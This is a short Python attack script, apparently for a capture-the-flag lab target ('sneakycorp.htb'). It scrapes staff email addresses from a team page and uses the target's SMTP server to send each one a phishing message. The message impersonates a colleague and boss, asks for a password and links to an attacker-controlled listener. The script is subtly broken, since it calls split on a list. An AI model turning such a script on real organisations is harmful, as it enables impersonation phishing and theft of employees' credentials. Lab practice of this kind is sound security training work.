#!/usr/bin/env python3

import requests
import re
import smtplib

web = 'http://sneakycorp.htb/team.php'
try:
    data = requests.get(web)
except:
    print('Error while getting the webpage')
emails = re.findall(r'<td>(.*\.htb)</td>{1,}', data.text)
print('writing all emails to emails.txt')
# with open('emails.txt', 'w+') as f:
#    for i in emails:
#        f.write(i + ', ')

sender = 'carastevens@sneakymailer.htb'

message = '''From: carastevens@sneakymailer.htb
To: You
Subject: password needed

hello,
http://10.10.14.141:80/

your boss,
Cara
'''

def send_message(receiver):
    smtpobj = smtplib.SMTP('10.10.10.197', 25)
    try:
        smtpobj.sendmail(sender, receiver, message)
        print(f'sent email to {receiver}')
    except Exception as e:
        print(e)
        exit()

for a in emails.split(' '):
    send_message(a)
print('Done!')
print(f'Sent Message to {len(emails)} users')
exit()
